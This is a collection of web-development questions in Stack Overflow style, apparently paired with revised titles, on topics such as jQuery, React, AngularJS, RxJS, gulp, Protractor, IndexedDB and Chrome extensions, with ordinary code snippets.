String, ByVal proxyname As String, ByVal proxylogin As String, ByVal proxypassword As String, ByVal userAgent As String, ByVal referer As String) As String Dim resp As HttpWebResponse Dim req As HttpWebRequest = DirectCast(WebRequest.Create(url), HttpWebRequest) If userAgent = """" Then userAgent = ""Mozilla/4.0 (compatible;

Jquery: .clone() vs .html()," What is the difference between Jquery's .clone() and .html() functions?Jquery documentation states: The .clone() method performs a deep copy of the set of matched elements, meaning that it copies the matched elements as well as all of their descendant elements and text nodes. In an HTML document, .html() can be used to get the contents of any element. If the selector expression matches more than one element, only the first match will have its HTML content returned.To me these seem to interchangeable, so are there specific situation where one would be used of the other? <code> ",What's the difference between .clone() and .html()?
What is the right way to handle streaming a video file to an html5 video player with Node.js so that the video controls continue to work?," Tl;Dr - The Question:What is the right way to handle streaming a video file to an html5 video player with Node.js so that the video controls continue to work?I think it has to do with the way that the headers are handled. Anyway, here's the background information. The code is a little lengthy, however, it's pretty straightforward.Streaming small video files to HTML5 video with Node is easyI learned how to stream small video files to an HTML5 video player very easily. With this setup, the controls work without any work on my part, and the video streams flawlessly. A working copy of the fully working code with sample video is here, for download on Google Docs.Client: Server: But this method is limited to files < 1GB in size. Streaming (any size) video files with fs.createReadStreamBy utilizing fs.createReadStream(), the server can read the file in a stream rather than reading it all into memory at once. This sounds like the right way to do things, and the syntax is extremely simple:Server Snippet: This streams the video just fine!

for-in vs Object.key forEach without inherited properties," I was looking at a perf benchmark of Object.keys + forEach vs for-in with normal objects.This benchmark shows that Object.keys + forEach is 62% slower than the for-in approach. But what if you don't want to get the inherited properties? for-in includes all non-native inherited objects, so we'll have to use hasOwnProperty to check.I tried to make another benchmark here doing exactly that. But now the for-in approach is 41% slower than Object.keys + forEach.updateThe above test was done in Chrome. Tested it again but with Safari and I'm getting different results: Object.keys(..).forEach(..) 34% slower, odd. Note: The reason I'm benchmarking is to check how it is with Node.js. Questions:Are the jsperf result for Chrome considerable for Node.js?What happened, how come a single conditional made the for-in approach 41% slower than Object.keys + forEach in Chrome? <code> ",for-in vs Object.keys forEach without inherited properties

Why my fixHeights code work wrong when browser window restored after being maximised?," I wrote this ""awesome"" code, that fixes elements height for stupid browsers that calculate it wrong.It fixes height fine when user resize browser by holding it's borders with mouse or window maximizes, but once window getting restored, heights calculated wrongly and scroll bar appears.

Why declare a property in prototype instead of constructor?," I completely understand why it's better to use the prototype instead of the constructor to define a class method, (i.e. Use of 'prototype' vs. 'this' in JavaScript?) However, I recently came across a HashMap class that defines the count property in the prototype and the map property in the constructor: Are there advantages of declaring an instance property like count in the prototype instead of saying this.count_ = 0; in the constructor? And if so, why not also js_cols.HashMap.prototype.map_ = {};?Edit: A similar question was asked, Why declare properties on the prototype for instance variables in JavaScript, and ""default values"" was raised as a use case, but it was not explained why this is more desirable than just defining the default value in the constructor. <code>  js_cols.HashMap = function(opt_map, var_args) { /** * Underlying JS object used to implement the map. * @type {!Object} * @private */ this.map_ = {}; /...}/** * The number of key value pairs in the map. * @private * @type {number} */js_cols.HashMap.prototype.count_ = 0;",Why declare an instance property in prototype instead of constructor?

Sorting is enabled and initialized as well as selecting a single row: I am able to select a row and the rows are sorted by the ""Name"" column in ascending order as configured.As shown in the UI Grid Tutorial 210, I have added logic to automatically select the first item after my data has been loaded and added to the grid: But this code is selecting the first item of the unsorted data. There are about 500 items in my grid, which is not much and performs well, but in this case the selected item is somewhere down the line and invisible.Is there any option to directly access the rows or the sorted data of the UI Grid?I know that external sorting could solve that problem, because then I would assign the already sorted data to the grid.

detect underline and strike trough," Is there any way to detect with JavaScript/jQuery if an element is strike-through and underlined.So let's say we have: Is it possible to detect if the text within <s> is also underlined?*Ideally, it would not be allowed to look if <u> has any <s> children.I've been toying around with it and it seems peculiar that both styles use the same CSS property, which in turn makes me wonder how it even works in the first place.To make my problem clearer:I'm playing around with a self-made wysiwyg editor, for usability reasons I'm trying to implement a listener on the text which alters (lights up) editing buttons. e.g. when a part of text is bold the ""B"" button changes to an active state. I'm currently handling this by getting the element at the cursor and checking if the element is bold or inherits it. The problem with underline and striketrough is that they are neither overwriting the text-decoration attribute of each other, and are not visible in csswhen I put the cursor on a underlined text-fragment, the text-decoration property only shows as underline, while the text is both underline and line-through. In such situations I cannot know what the exact relation is between the <u> element and the <s> element; the <s> element could be 100 parents back as far as I could know.A lot of text, but I hope it kinda clears up my situation. <code>  <u><s>text here.</s>other text here.</u>",detect underline and strike through
What is your take on passing state in FLUX?," I am a bit confused by the statements: ""Renders the whole application"" and ""Passing state to child components"".Example 1:I have a todos app with a AppComponent and TodosListComponent. The AppComponent grabs the array of todos from the store and passes it as a property to the TodosListComponent.Example 2:I have a huge application with lots state. I have like 50 components building up my app. Do I want to pass all the state from the stores from AppComponent down through all the 50 components?So I am wondering, what is the convention? It makes more sense to me to let individual components listen directly to the stores they care about. The advantage is that only individual components rerender, but why then the concept of ""the whole application rerender on state change""?What are the pros and cons of each? What is the common convention? <code> ","Passing store state as props, or each component accessing global stores?"

jQuery RegEx Vin Validation for pre 1980 and post 1980," In 1981, Vehicle Identification Numbers (VINs) were standardized using a seventeen digit system. Prior to 1981, manufacturers used VINs unique to their own company and there was no accepted standard for these numbers, so different manufacturers used different formats..http://www.crankshaftcoalition.com/wiki/VIN_decodingIt required all over-the-road-vehicles sold to contain a 17-character VIN, which does not include the letters I (i), O (o), or Q (q) (to avoid confusion with numerals 1 and 0).http://en.wikipedia.org/wiki/Vehicle_identification_numberSo what I am trying to accomplish is having a drop down and if anywhere from 1980 - 1900 is chosen the VIN will either follow the guidelines of the manufactures or just not apply at all where the letters I (i), O (o), or Q (q) could be used and any number of characters/numbers. But then if 1981 and later is chosen the RegEx to kick in and demand it to be formatted with the Expression that I have showing a valid or invalid VIN.Plugged a valid VIN in for the time being for testing purposes.. if you delete the last number it will show ""Invalid Vin""Any suggestions or help would be greatly appreciated! http://jsfiddle.net/ommLz4th/1/RegExp jQuery Vin Validator HTML Drop Down for test purposes Actual Drop down <code>  ^[A-HJ-NPR-Z\\d]{8}[\\dX][A-HJ-NPR-Z\\d]{2}\\d{6}$ $(function() { $(""#vin"").on(""keyup blur"", function() { if (validateVin($(""#vin"").val())) { $(""#result"").css('color', 'green').html(""Valid VIN""); $(""#vin"").removeClass(""not-ok"").addClass(""ok""); } else { $(""#result"").css('color', 'red').html(""Invalid VIN""); $(""#vin"").removeClass(""ok"").addClass(""not-ok""); } });});function validateVin(vin) { var re = new RegExp(""^[A-HJ-NPR-Z\\d]{8}[\\dX][A-HJ-NPR-Z\\d]{2}\\d{6}$""); return vin.match(re);} <script src=""https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js""></script><label name=""vin"">VIN</label><input type=""text"" id=""vin"" value=""1FAFP40634F172825"" /><span id=""result""></span> <select name=""vehicleyear"" id=""vehicleyear""> <option value="""">Choose Year</option> <option value=""1985"">1985</option> <option value=""1984"">1984</option> <option value=""1983"">1983</option> <option value=""1982"">1982</option> <option value=""1981"">1981</option> <option value=""1980"">1980</option> <option value=""1979"">1979</option> <option value=""1978"">1978</option> <option value=""1977"">1977</option> <option value=""1976"">1976</option> <option value=""1975"">1975</option> <option value=""1974"">1974</option></select> <cfparam name=""form.vehicleyear"" default=""""><cfset VARIABLES.y1=DatePart(""yyyy"",Now())><cfset VARIABLES.y2=VARIABLES.y1+2><cfif Val(form.vehicleyear) LT VARIABLES.y1 or Val(form.vehicleyear) GT VARIABLES.y2></cfif> <cfoutput> <cfselect name=""vehicleyear"" id=""vehicleyear"" required=""yes"" message=""Please select vehicle year.""> <option value="""" selected=""selected"">Select Year</option> <cfloop index=""i"" from=""#VARIABLES.y2#"" to=""1900"" step=""-1""> <option value=""#i#""<cfif form.vehicleyear EQ i> selected</cfif>>#NumberFormat(i,""0000"")#</option> </cfloop> </cfselect> </cfoutput>",RegEx Vin Validation for pre 1980 and post 1980

Import file in a chrome extension," I'm trying to develop import feature for my chrome extension, but this task seems more difficult then expected.Actually my idea is to use an TO load the file and then add a change listener on that element: Now there are several problem that i'm facing: The first problem is that the popup is closed when the open dialog opens, and it causes all related object and code to be destroyed with the popup page. And looking at other question, this is the normal behaviour of a chrome extension, when it lost focus the popup will be destroyed.I found another solution, that suggests to add the file logic into the background page, that will not be destroyed if the popup lost focus. Then i added this function in background: And then i updated my popup.js to call the background method: And in that way the file_import is called by popup, it adds the change listener to myInput element, and opens up the File Open dialog but... opening the file dialog the popup is gone, and everything related to it, then... same problem again. So i decided to try to create a new input file element in background page, and trigger click event from it, but obviously it doesn't work.So, I'm stuck here, with no good ideas on how to solve that problem. Or at least i have few in my mind, but i don't know if they work, or they are just workaround. One of them is to move the import feature into the devtools area (since it is an extension useful for developer it makes sense), where I hope that the open file dialog, doesn't cause to my extension to be destroyed. Or another maybe could be to move the import file logic into an external page that opens a new tab and import the values from the files. In that case, since what I need only to access, except the file content is the current tab URL, maybe I don't have to use Google Chrome API. The third idea is to inject an html element into the current page, and then access it from the extension adding the listener directly to that element, and in that case i don't think that my listener is destroyed if the popup is destroyed (the page will be reloaded just after the import, so my hidden input will stay just for the time needed for the operation).To sum up my questions are: There is a clean way to read file content inside a chrome extension, without the need to use external files, open new tabs, etc (if possible i prefer to keep everything inside the extension)? If no is possible to prepopulate a new tab with a JavaScript file? Can i add a listener to DOM elements inside the current page?  <code>  <input type=""file"" id=""myInput""> element.addEventListener('change', function(evt){ read_single_file(evt,tab);} file_import = function(element, tab) { element.addEventListener('change', function(evt){ read_single_file(evt,tab); }, false); element.click(); console.log(""uffa"");} get_current_tab(function(tab){ var BGPage = chrome.extension.getBackgroundPage(); BGPage.file_import(document.getElementById('myInput'), tab); });",Open (Import) file in a chrome extension

One last issue is that I can't access that config from the initConfig for setting the proxy as initConfig runs first: This post (Access Grunt config data within initConfig()) outlines the issue but I'm not sure how I could run the request synchronously outside of a task?EDIT2 [solved]: Corys answer + this post Programmatically pass arguments to grunt task? solved the issue for me. <code>  grunt.registerTask('setProxyHost', 'Pings the url shortener to get the latest test server', function() { request('http://urlshortener/devserver', function(error, response, body) { if (!error) { var loc = response.request.uri.href; if (loc.slice(0, 7) === 'http://') { proxyHost = loc.slice(7, loc.length - 1); } } });}); module.exports = function(grunt) {[...] grunt.initConfig({ connect: { proxies: [{ host: grunt.config.get('proxyHost') module.exports = function(grunt) {[...] grunt.initConfig({ connect: { proxies: [{ host: '<%= proxyHost %>',",Run grunt task asynchronously before another task

Draw clickable grid of 1 milion squares," I need to find a way to draw a 1000x1000 squares grid, each square is clickable and they must be independently color changeable. Like mines game. I can use HTML (pure or using Canvas or SVG), CSS and JavaScript for this.I know how to create one grid with these characteristics with JavaScript and CSS, it does well with 10x10 squares, with 100x100 the squares will turn into tall rectangles and 1000x1000 it loads, but the ""squares"" are soo much compressed that borders meet each other and renders a full gray page.I tried using HTML and JavaScript to draw SVG squares, the squares' size problem solves, but I don't know how to make they change color when clicked and when I set to load 1000x1000 squares it will freeze the browse and eventually crash the tab.Is this feasible in any way?EDITSorry if I wasn't clear, but yes, I need scroll bars in that.

Samsung Galaxy S4 ( android 4.2.x ) - extremely slow when rendering canvas element," Im developing an app for android devices, and found that samsung galaxy S4 specifically, has extremely poor performance when app/web page uses canvas. Odd thing is, that its not always the case. I have tested 2 sample apps.http://ie.microsoft.com/testdrive/Performance/FishIETank/Default.htmland http://ie.microsoft.com/testdrive/Graphics/TouchEffects/Default.htmlthe first one works fine, and outperforms my Nokia (which is dual core) and is expected. However, the other demo, is almost completely unresponsive and framerate is close to 1, where as all other devices render it fine.Since the first app runs well and the other one doesnt, it beggs the question, why ?First one has no event listeners, where as the other one has touch listeners. Could touchmove be the cause instead of canvas...or is that demo using some canvas features that the other one isnt, and thus has poor performance.I have read lots of topics about this issue, and none seem to have answer. Most are many months old...so i thought ill make a new topic.Is there any way to solve the canvas issue on Samsung S4 ... and potentially other android devices running 4.2.x. If any StackOverflow users here has S4, can you test both demos and confirm my observations? <code> ",Some Android devices extremely slow when rendering canvas elements

React.js: How do you change the position of a Component item with Key," How do you change the position of a Component item in React? Unless I've misunderstood it, React orders list items by key, which is represented in the DOM by data-reactid, but I don't know how to modify the key of components on the page.i.e. How do you grab the component, change it's key, and then fire a render so that the reordered list renders in the order you've set?e.g. in the following code example, when the Click me link is clicked, the first list item would be swapped with the last list item.Ideally, this functionality would allow you to dynamically reorder/relocate any component on the page without changing the order of components in the render method.Here is a link to the repo where the full project is located: https://github.com/bengrunfeld/gae-react-flux-todos <code>  var TodoBox = React.createClass({ render: function(){ return ( <div className=""todo-container""> <h4>GAE React Flux Todos</h4> <TodoList data={this.state.data} /> </div> ) }});var TodoList = React.createClass({ changePosition: function(e){ // Change position of list item (e.g. to top/certain position/end of list) }, render:function(){ var todoNodes = this.props.data.map(function(todo) { return ( <Todo key={todo.id} id={todo.id}> {todo.todoText} </Todo> ); }); return ( <form className=""todoList""> {todoNodes} <a onClick={this.changePosition}>Click me</a> </form> ) }});var Todo = React.createClass({ render:function(){ return ( <div className=""todoItem""> <input type=""text"" className={this.props.id} onChange={this.checkInput} defaultValue={this.props.children} ref=""todoItem""/> </div> ) }});",React.js: How do you change the position of a Component item

Rspec & Capybara: Setting focus to an element," I have jump links for blind and keyboard users in my webpage which are moved out of the viewport to hide them visually; when they gain focus, they are moved into the viewport.I want to test this behaviour using RSpec and Capybara, but it somehow doesn't work. The JavaScript in evaluate_script doesn't seem to be executed properly. I tried the same JS ($('#jump_to_content > a').focus()) in the Chrome console, and I'm a bit unsure about the result, because while in the console, the link doesn't appear, but when clicking into the browser view, it appears for a part of a second and disappears again (it disappears because it doesn't have the focus anymore then). In my opinion it should be displayed directly after executing the JS.This makes me a bit insecure about all this. Any help is highly appreciated.UpdateI meanwhile have come to the conclusion that the behaviour of Chrome is normal: focus is kept in the console, so the element in fact doesn't really receive focus and doesn't show.I have also come to the conclusion that Capybara doesn't seem to be able to handle focusing an element (and applying :focus styles) properly.I have created the following CSS rules:a#jump_to_navigation color: black For testing this, I have set up this very specific test: The test breaks like this: So the focus is set properly, but the :focus styles aren't applied. I guess this is a problem with PhantomJS?I'd be very happy to find a solution around this problem. <code>  it 'moves the focus to the navigation when activating the corresponding link', js: true do expect(page).not_to have_css '#main:focus' page.evaluate_script ""$('#jump_to_content > a').focus()"" click_link 'Jump to content' expect(page).to have_css '#main:focus' end &:focus color: red visit root_pathselector = 'a#jump_to_navigation'# Initial styleexpect(page.evaluate_script('document.activeElement.id')).to eq '' # Make sure the link isn't focused yetexpect(page.evaluate_script(""$('#{selector}').css('color')"")).to eq 'rgb(0, 0, 0)' # Color initially is black# Set focuspage.evaluate_script(""$('#{selector}').focus()"")# Focused styleexpect(page.evaluate_script('document.activeElement.id')).to eq 'jump_to_navigation' # Make sure the link is focused nowexpect(page.evaluate_script(""$('#{selector}').css('color')"")).to eq 'rgb(255, 0, 0)' # Color is now red 1) Navigation jump links visually displays them only on focus Failure/Error: expect(page.evaluate_script(""$('#{selector}').css('color')"")).to eq 'rgb(255, 0, 0)' # Color is now red expected: ""rgb(255, 0, 0)"" got: ""rgb(0, 0, 0)"" (compared using ==)",Rspec & Capybara: Setting focus to an element using jQuery doesn't apply `:focus` CSS

What's the idiomatic way to extend a d3 function?," For a time series visualization in d3, I want to highlight years on the axis. I've accomplished this by making my own xAxis renderer, which invokes the native axis function and then implements my own custom logic to format the ticks that it renders. This is how I've done it (see working example on jsbin): This gets the job done, but feels wrong; and it hasn't really extended the axis, it's only wrapped it. Ideally my customXAxis would inherit the properties of d3's axis component, so I would be able to do things like this: Thanks to @meetamit and @drakes for putting this together.

How is ES6 WeakMap even useful?," What are the actual uses of the WeakMap data structure introduced in ECMAScript 6?Since a key of a weak map creates a strong reference to its corresponding value, ensuring that a value which has been inserted into a weak map will never disappear as long as its key is still alive, it can't be used for memo tables, caches or anything else that you would normally use weak references, maps with weak values, etc. for.It seems to me that this: ...is just a roundabout way of saying this: What concrete use cases am I missing? <code>  weakmap.set(key, value); key.value = value;",What are the actual uses of ES6 WeakMap?
How to cancel a EMCAScript6 (vanilla JavaScript) promise chain," Is there a method for clearing the .thens of a JavaScript Promise instance?I've written a JavaScript test framework on top of QUnit.

firefox extension works through sdk but not when installed in browser," ---Update----After experimenting more with this, I've determined that the contentScript I have written is not the problem here. For example, if I reduce the extension to merely: The button will still appear when I run the extension through the SDK, but will not appear when I install the xpi in a current firefox browser (version 38, on some platforms). This problem seems to be occurring at a very basic level in their design process.I am trying to write a simple extension for firefox which appends a form to the current page and posts data to another site. It can be called by an action button or through a context menu item.I have been developing with the add-on sdk and it is working perfectly when I use cfx run to test it. However, after doing cfx xpi and installing the extension into my firefox browser, it does not work at all. The action button and context menu item do not appear, and although the extension shows up under add-ons -> extensions as installed and enabled, none of the images packaged with the xpi will display.I am not sure what could be causing this, and my code is fairly brief, so I will add my entire main.js: I've noticed that when I run cfx xpi the automatically generated install.rdf file says the maximum version for compatibility is 30.0. However, I have also found that on some computers running versions of firefox up to and including 38 it will work perfectly.

Manually fire an IDBOpenDBRequest.onupgradeneeded event?," I am writing a Chrome extension that utilizes IndexedDB to store some information client side in an IDBObjectStore within an IDBDatabase.The nature of the data is such that I need my users to be able to modify the object store at their whim. (add new objects modify existing ones etc.) I am accomplishing this through a settings page and all is fine and dandy so far.The caveat comes when I want to release a new version of the (default) object store. If I didn't care about overwriting my users' data, then I could just handle the onupgradeneeded event the same way I handle it when it is fired in reaction to a fresh install. Which would be something like: ...but I do care.So, what I am currently doing is placing a conditional inside of the upgrade(event) function that checks for the truthyness of event.oldVersion (its 0 on a fresh install). If the value is greater than 0, then I open a new tab that contains an options page where the user can pick and choose which objects he wants to update.Now the tricky part: Once this page closes I need to send a message to the background page that contains the necessary upgrade information. Normally, I would just receive the message in my listener and perform the update, utilizing the provided information. However, IDBDatabase.createObjectStore() throws an InvalidStateError if:The method [is] not called from a versionchange transaction callback.When I look at the spec for IDBDatabase.transaction(storenames, mode), in the mode parameter description, it says:versionchange mode can't be specified here.So, it seems to me like I need to trigger an onupgradeneeded event, but I also need to pass the event handler an additional parameter, besides the event itself, which contains information that it can use to decide how to perform the upgrade.I don't know how to go about doing this though.Can anyone offer me some insight? <code>  var request = window.indexedDB.open(DB_NAME, CURRENT_DB_VERSION);request.onupgradeneeded = upgrade;function upgrade(event){ var db = event.target.result; var objectStore = db.createObjectStore(""domains"", {keyPath: ""id"", autoIncrement: true}); objectStore.createIndex(""domain"", ""domain"", {multiEntry: true }); for(var i=0; i<tags.length; i++){ objectStore.add(tags[i]); console.log(""added "" + tags[i][""domain""] + "" to the IDBObjectStore 'domains' in the IDBDatabase 'Tags' (Format)""); }}",IndexedDB: Can you manually initiate a version change transaction?

Multiple browsers and the page object pattern," We are using the Page Object pattern to organize our internal AngularJS application tests. Here is an example page object we have: In a single-browser test, it is quite clear how to use it: But, when it comes to a test when multiple browsers are instantiated and there is the need to switch between them in a single test, it is becoming unclear how to use the same page object with multiple browsers: Problem:After we forked a new browser, how can we use the same Page Object fields and functions, but applied to a newly instantiated browser (browser2 in this case)?In other words, all element() calls here would be applied to browser, but needed to be applied to browser2. How can we switch the context?Thoughts:one possible approach here would be to redefine the global element = browser2.element temporarily while being in the context of browser2. The problem with this approach is that we also have browser.wait() calls inside the page object functions. This means that browser = browser2 should be also set. In this case, we would need to remember the browser global object in a temp variable and restore it once we switch back to the main browser context..another possible approach would be to pass the browser instance into the page object, something like: but this would probably require to change every page object we have..Hope the question is clear - let me know if it needs clarification. <code>  var LoginPage = function () { this.username = element(by.id(""username"")); this.password = element(by.id(""password"")); this.loginButton = element(by.id(""submit""));}module.exports = LoginPage; var LoginPage = require(""./../po/login.po.js"");describe(""Login functionality"", function () { var scope = {}; beforeEach(function () { browser.get(""/#login""); scope.page = new LoginPage(); }); it(""should successfully log in a user"", function () { scope.page.username.clear(); scope.page.username.sendKeys(login); scope.page.password.sendKeys(password); scope.page.loginButton.click(); // assert we are logged in });}); describe(""Login functionality"", function () { var scope = {}; beforeEach(function () { browser.get(""/#login""); scope.page = new LoginPage(); }); it(""should warn there is an opened session"", function () { scope.page.username.clear(); scope.page.username.sendKeys(login); scope.page.password.sendKeys(password); scope.page.loginButton.click(); // assert we are logged in // fire up a different browser and log in var browser2 = browser.forkNewDriverInstance(); // the problem is here - scope.page.username.clear() would be applied to the main ""browser"" });}); var LoginPage = function (browserInstance) { browser = browserInstance ? browserInstance : browser; var element = browser.element; // ...}",Multiple browsers and the Page Object pattern

How can I insert content during a gulp build?," I managed to accomplish my task using a gulp plugin called gulp-insert like this: What I'm doing is reading our app's configuration file which is managed by the config module on npm. Getting our config file from server-side code is a snap using var config = require('config');, but we're a single-page app and frequently need access to the configuration settings on the client-side. To do that I stuff the config object into an Angular service.Here's the Angular service before gulp build. The placeholder is in a string so that it's valid JavaScript for some of the other gulp plugins that process the file first. The gulpInsert utility lets me insert the config like this. This works but feels a little hacky. Not to mention that it has to buffer the whole bundled file just so I can perform the operation. Is there a more elegant way to accomplish the same thing? Preferably one that allows the stream to keep flowing smoothly without buffering the whole bundle at the end? Thanks! <code>  gulp.task('compile-js', function () { // Minify and bundle client scripts. var scripts = gulp.src([ srcDir + '/routes/**/*.js', srcDir + '/shared/js/**/*.js' ]) // Sort angular files so the module definition appears // first in the bundle. .pipe(gulpAngularFilesort()) // Add angular dependency injection annotations before // minifying the bundle. .pipe(gulpNgAnnotate()) // Begin building source maps for easy debugging of the // bundled code. .pipe(gulpSourcemaps.init()) .pipe(gulpConcat('bundle.js')) // Buffer the bundle.js file and replace the appConfig // placeholder string with a stringified config object. .pipe(gulpInsert.transform(function (contents) { return contents.replace(""'{{{appConfigObj}}}'"", JSON.stringify(config)); })) .pipe(gulpUglify()) // Finish off sourcemap tracking and write the map to the // bottom of the bundle file. .pipe(gulpSourcemaps.write()) .pipe(gulp.dest(buildDir + '/shared/js')); return scripts.pipe(gulpLivereload());}); angular.module('app') .factory('appConfig', function () { return '{{{appConfigObj}}}'; }); .pipe(gulpInsert.transform(function (contents) { return contents.replace(""'{{{appConfigObj}}}'"", JSON.stringify(config));}))",How can I insert content into a file during a gulp build?

Load iOS 'smart app banner' through javascript," I'm having some troubles with an iOS Smart App Banner, which I'm trying to add through JavaScript.The actual smartbanner is as simple as adding this little block to the head of the HTML: Unfortunately, I'm quite restricted in the way I can upload my script. I can't change the HTML directly, so I'll do it through our Tag Manager, which basically does it through JavaScript. But it turns out that this doesn't work.I've tried to simplify the case for testing:Hardcoded tag in the HTML: works (as expected) Inserted with JavaScript directly when the document is ready: works Inserted with JavaScript, after a setTimeout delay: DOES NOT WORK Can anyone confirm or explain why this delayed JavaScript doesn't work?Important: for testing open the page on an actual iOS device!Desktop Safari/Chrome or iOS emulator won't work.Also, don't close the banner, because it won't show up a second time.UPDATE:I've added some examples without jQuery, so plain 'ol JavaScript. But the results are the same. As soon as we wait for a setTimeout() the Smart App Banner fails to load.Vanilla JavaScript - direct execution. works Vanilla JavaScript - delayed execution. DOES NOT WORK UPDATE 2:The exact same unfortunate behavior can be observed when loading the script asynchronouslyasync loading.

This is because we have a specs directory where we keep the specs and multiple directories inside grouped by application functionality under test.The Question:What is the canonical way to approach the relative path problem in Protractor?In other words, we'd like to avoid traversing the tree, going up to import modules. It would be much cleaner to go down from the base application directory instead.Attempts and thoughts:There is a great article about approaching this problem: Better local require() paths for Node.js, but I'm not sure which of the options is a recommended one when developing tests with Protractor.We've also tried to use require.main to construct the path, but it points to the node_modules/protractor directory instead of our application directory.  <code>  ""use strict"";var helpers = require(""./../../helpers/helpers.js"");var localStoragePage = require(""./../../helpers/localStorage.js"");var sessionStoragePage = require(""./../../helpers/sessionStorage.js"");var loginPage = require(""./../../po/login.po.js"");var headerPage = require(""./../../po/header.po.js"");var queuePage = require(""./../../po/queue.po.js"");describe(""Login functionality"", function () { beforeEach(function () { browser.get(""/#login""); localStoragePage.clear(); }); // ...});",Using require with relative paths
"in javascript, is it possible to ""freeze"" a Set (or Map)?"," while Set is an Object, Object.freeze() works on the object's properties, which evidently Map and Set do not use: eg this is the behavior in Chrome, and I expect it's standard.I understand that one could (sometimes) transform the Set or Map into a normal Object, and then freeze the object. but then key access changes between the unfrozen and frozen version. <code>  let m = new Map();Object.freeze(m);m.set( 'key', 55);m.get( 'key' ) ==> 55","Is it possible to ""freeze"" a Set (or Map)?"

JavaScript - Detecting the difference between 0 and -0," I am using MomentJS to calculate the difference between two times. The weird thing is about this library is the difference between today and today is 0. The difference between today and tomorrow is -0.My question is, how do I differentiate between 0 and -0. It seems JavaScript treats them the same.So for example if I write the following code: Here's an example on JSFiddle as to how it handles the returned values (I am in Australia so depending on where you are in the word you may have to adjust the today and tomorrow dates) <code>  if (tomorrow === -0) console.log('It is tomorrow!');else if (tomorrow === 0) console.log('It is today!');",JavaScript - Detecting the difference between positive zero and negative zero

Does Angular have a syntax to alias a property within a div?," This is kind of a weird question, but here's the idea:Let's say I have a complex JSON object coming back from an HTTP call and attaching to the $scope. Something like this: Now, if I wanted to display an overview of purchase history in an AngularJS partial, I could do something like this: The really convenient thing about this format (though it's not super evident here with so few props) is that the purchase being described is aliased as p. I don't have to do obj.purchase_hist[0].item_id, I can just do p.item_id.But what about when I go to show the user's home address? Do I really have to do this?: That's really verbose. I would much rather use something akin to the controller as ... syntax, something like this: Is there such a thing that exists in AngularJS ? Unfortunately I'm not very able to use plugins in my environment, so I'm specifically looking for a part of angular core that will work this way.Thanks! <code>  $scope.obj = { user: { id: 10, name: { first: 'Joe', last: 'Smith' }, contact: { home: { street: '101 First St.', city: 'Myville', state: 'Jokelahoma', zip: '98765' }, email: 'joeshmoe@gmail.com', phone: '+12345678901' } }, purchase_hist: [ { item_id: 11004, date: 'Thu, 06 Aug 2015 13:51:17 GMT' }, { item_id: 97020, date: 'Fri, 31 Jul 2015 18:57:57 GMT' } ]} <table> <tr ng-repeat=""p in obj.purchase_hist""> <td>{{p.item_id}}</td> <td>{{p.date}}</td> </tr></table> <div> <p>{{obj.user.contact.home.street}}</p> <p>{{obj.user.contact.home.city}}</p> <p>{{obj.user.contact.home.state}}</p> <p>{{obj.user.contact.home.zip}}</p></div> <div ng-alias=""obj.user.contact.home as uhome""> <p>{{uhome.street}}</p> <p>{{uhome.city}}</p> <p>{{uhome.state}}</p> <p>{{uhome.zip}}</p></div>",Does AngularJS have a syntax to alias a property within a div?

Note how the accepted answer is: ""My suggestion is: tell JSLint to shut up"".

ES6 / Babel destructuring error with Set," I have the following code, simplified from a real-world example. The problem is that this fails, and produces an empty arr2 on Google Chrome which has a native Set implementation, but a polyfilled Array.from.

I've set a breakpoint inside of _toConsumableArray and I can see it producing an empty Array through the call to Array.from.My question is, is this a bug in the Array.from polyfill, in that it doesn't properly process a native (not polyfilled) Set, or is the problem with the Babel code, in that Array.from(x) is not a perfect equivalent for ...x (when x is not an array). <code>  let arr = [0,1,2], s = new Set(arr);let arr2 = [...s];alert('3 == ' + arr2.length); var arr2 = [].concat(_toConsumableArray(s));",ES6 / Babel spread error with Set

Hot and Cold observables : are there 'hot' and 'cold' operators?," I reviewed the following SO question:What are the Hot and Cold observables?To summarize:a cold observable emits its values when it has an observer to consume them, i.e. the sequence of values received by observers is independent of time of subscription. All observers will consume the same sequence of values.a hot observable emits value independently of its subscriptions, i.e. the values received by observers are a function of the time of subscription.Yet, I feel like hot vs. cold is still a source of confusion. So here are my questions:Are all rx observables cold by default (with the exception of subjects)? I often read that events are the typical metaphor for hot observables, but I also read that Rx.fromEvent(input, 'click') is a cold observable(?).Are there/what are the Rx operators which turn a cold observables into a hot observable (apart from publish, and share)?For instance, how does it work with Rx operator withLatestFrom? Let cold$ be a cold observable which has somewhere been subscribed to. Will sth$.withLatestFrom(cold$,...) be a hot observable? Or if I do sth1$.withLatestFrom(cold$,...), sth2$.withLatestFrom(cold$,...) and subscribe to sth1 and sth2, will I always see the same value for both sth?I thought Rx.fromEvent creates cold observables but that is not the case, as mentioned in one of the answers. However, I am still baffled by this behaviour: https://codepen.io/anon/pen/NqQMJR?editors=101. Different subscriptions get different values from the same observable. Wasn't the click event shared? <code> ",Hot and Cold observables: are there 'hot' and 'cold' operators?

When does a javascript error break the rest o the code?," I've noticed sometimes that one javascript error will break other unrelated javascript functionality and sometimes it doesn't. I couldn't see a pattern in it and this makes debugging difficult (especially when you take on an old project and you don't have time to fix all errors).For example this code: Was breaking this code: when there was no .div-one element on the page. It retuned an element undefined error. so I wrapped it in an if statement checking for the length of .div-one and now the code works fine.But obviously there are lots of cases when javascripts error do not break anything.So when will js error cause problems? The 2 pieces of code were in the same file. Maybe it affects only same file?Thanks! <code>  $("".div-one"").slick({ // settings for slick plugin }); $('.product-options').click(function() { $('.message').slideToggle('show');});",When does a javascript error break the rest of the code?

How to properly implement an ajaxify plugin," The main goal is to keep non-refreshed the logotext <div class=""small-7 medium-4 columns logo""> and the menu <nav class=""pagedMenu"" role=""navigation"">,without clipping on page refresh or while the content is loading from a page to another. Also, the menu state should be preserved from a page to another. I've found here a possible solution that could solve the problem (you could use ajax to fetch the updated content and use jQuery to put the new content on the page and avoid the refresh entirely. Doing it that way, the existing data in the page would remain untouched. said @jfriend00) So, I have tried to use an Ajax plugin (called AWS). In the AWS option page, I (suppose) that I've done the right thing pointing wrapper as Ajax container ID and also pagedMenu as Menu container class, Transition Effect Enabled, No ajax container IDs blank, no loader selected, having already a pulse loader implemented in the theme.At this point, all I got it's a menu / side-menu (shiftnav) / pulse dot loader / content loading malfunction, generated perhaps by the wrong defined Ajax container id and/or menu container class(?) OR by a conflict with an existing JS / jQuery code, not so sure.Also in Chrome console there is an error: Everything is getting back to normal on page refresh but doesn't help at all, being useless.I also have to mention that for the menu I've tried to keep the state using jQuery-Storage-API and storage=jQuery.sessionStorage; as you can 